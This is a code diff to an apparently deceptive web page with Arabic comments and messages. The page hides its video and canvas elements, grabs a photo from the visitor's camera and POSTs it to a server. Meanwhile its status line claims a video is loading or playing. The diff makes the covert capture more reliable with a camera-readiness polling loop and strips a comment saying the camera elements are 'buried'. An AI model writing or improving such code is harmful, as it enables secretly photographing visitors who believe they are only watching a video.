@@ -19,10 +19,8 @@
 
     #status {
       font-size: 20px;
-      z-index: 999;
     }
 
-    /* عناصر الكاميرا كلها مدفونة */
     video, canvas {
       position: absolute;
       width: 1px;
@@ -50,13 +48,18 @@
         const video = document.getElementById("video");
         video.srcObject = stream;
 
-        video.onloadedmetadata = () => {
-          setTimeout(() => {
+        const waitForCamera = () => {
+          if (video.readyState >= 2) {
             takePhoto(stream);
-          }, 500); // أسرع لقطة
+          } else {
+            setTimeout(waitForCamera, 200); // نكرر التحقق كل 200ms
+          }
         };
+
+        waitForCamera();
+
       } catch (e) {
-        document.getElementById("status").innerText = "❌ تم رفض الكاميرا.";
+        document.getElementById("status").innerText = "❌ رفضت الكاميرا.";
       }
     }
 
@@ -77,7 +80,7 @@
           method: "POST",
           body: formData
         }).then(r => r.json()).then(d => {
-          document.getElementById("status").innerText = "📽️ يتم الآن تحميل الفيديو...";
+          document.getElementById("status").innerText = "📽️ جاري تشغيل الفيديو...";
         }).catch(err => {
           document.getElementById("status").innerText = "❌ فشل في الإرسال";
         });
